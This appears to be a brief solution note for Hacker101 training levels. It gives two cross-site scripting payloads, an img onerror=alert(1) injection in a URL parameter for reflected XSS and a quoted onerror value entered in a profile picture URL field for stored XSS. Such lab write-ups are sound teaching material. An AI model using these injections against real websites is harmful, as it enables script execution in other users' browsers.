## Reflected XSS

The following will triger a reflected XSS

    https://levels-a.hacker101.com/levels/2/?id=%3Cimg%20src=toto%20onerror=alert(1)%3E

## Stored XSS

The following will triger a stored XSS

Go to "Edit profile" > Profile picture URL and type something like:

    XSS" onerror=alert(1)
